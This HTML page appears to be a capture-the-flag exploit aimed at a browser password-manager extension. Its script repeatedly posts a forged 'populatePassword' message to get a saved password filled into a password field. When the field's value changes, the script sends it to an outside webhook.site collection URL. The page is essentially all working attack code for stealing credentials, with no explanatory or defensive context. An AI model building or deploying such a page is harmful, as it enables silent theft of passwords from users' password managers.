<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>borg</title>
    </head>
    <body>
        <input type="password" id="lol" />
        <button onclick="change()">click me</button>

        <script>
            let field = document.getElementById("lol");

            let lastValue = field.value;
            console.log(lastValue);

            setInterval(() => {
                window.postMessage(
                    {
                        action: "populatePassword",
                        url: "http://flag",
                        password: "YourPassword", // Replace with the desired password
                    },
                    "*"
                );

                if (lastValue != field.value) {
                    console.log("changed");
                    lastValue = field.value;
                    fetch(
                        "https://webhook.site/224a98ac-5861-43fa-90ed-22d67f21a61b?val=" +
                            lastValue
                    );
                }
            }, 10);

            function change() {
                field.value = "lol";
                alert("changed");
            }
        </script>
    </body>
</html>
